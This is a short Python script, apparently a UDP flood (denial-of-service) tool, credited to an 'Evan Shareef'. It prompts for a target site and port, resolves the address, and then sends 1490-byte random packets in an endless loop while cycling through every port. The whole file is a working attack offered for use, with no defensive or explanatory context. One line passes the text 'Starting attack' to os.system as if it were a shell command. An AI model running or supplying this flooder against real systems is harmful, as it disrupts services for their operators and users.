import socket
import os
import random


ip = input("Enter url of target site ");
ip = socket.gethostbyname(ip);

port = int(input("Enter port number "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")
os.system("Starting attack")

print ("Author : Evan Shareef");

bt = random._urandom(1490);

while True:
	sock.sendto(bt,(ip,port));
	port+=1;
	print("Sending packets");
	if port==65534:
		port = 1;
